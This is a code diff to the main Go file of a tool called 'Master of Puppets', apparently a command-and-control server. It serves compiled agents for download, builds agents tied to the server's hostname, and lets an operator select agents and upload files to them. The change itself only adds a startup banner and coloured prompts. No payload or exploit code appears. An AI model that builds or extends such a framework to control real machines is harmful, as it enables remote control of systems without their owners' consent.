@@ -5,6 +5,7 @@ import (
 	"MoP/src/config"
 	"MoP/src/controllers"
 	"MoP/src/db"
+	"MoP/src/messages"
 	"MoP/src/middlewares"
 	"MoP/src/router"
 	"bufio"
@@ -19,7 +20,7 @@ import (
 )
 
 var (
-	term          = "MoP> "
+	term          = fmt.Sprintf("[[Master of Puppets %s ]]>>> ", config.Load().Hostname)
 	selectedAgent = ""
 )
 
@@ -34,6 +35,8 @@ func main() {
 	r := router.Generate()
 	// rota para o file server que conterá os agentes compilados
 	r.PathPrefix("/downloads/").Handler(http.StripPrefix("/downloads/", http.FileServer(http.Dir("../agents"))))
+
+	messages.Banner(config.Hostname)
 
 	go killAgent()
 	go cli()
@@ -58,7 +61,11 @@ func killAgent() {
 // cli no terminal
 func cli() {
 	for {
-		print(term)
+		if selectedAgent != "" {
+			messages.RedBold.Print(term)
+		} else {
+			messages.BlueBold.Print(term)
+		}
 		// le os comandos inputados
 		command, _ := bufio.NewReader(os.Stdin).ReadString('\n')
 
@@ -94,7 +101,7 @@ func cli() {
 					if len(slicedCommand) > 1 {
 						agentName = slicedCommand[1]
 					}
-					
+
 					commands.BuildAgents(agentName, config.Load().Hostname)
 				case "show":
 					// handler para as variações do comando show do pacote commands
@@ -104,9 +111,9 @@ func cli() {
 					// seleciona um agente com a validação do pacote commands
 					selectedAgent = commands.SelectHandler(slicedCommand)
 					if selectedAgent != "" {
-						term = selectedAgent + "@MoP# "
+						term = fmt.Sprintf("[[Agent %s]]>># ", selectedAgent)
 					} else {
-						term = "MoP> "
+						term = fmt.Sprintf("[[Master of Puppets %s ]]>>> ", config.Load().Hostname)
 					}
 				case "upload":
 					if selectedAgent != "" {
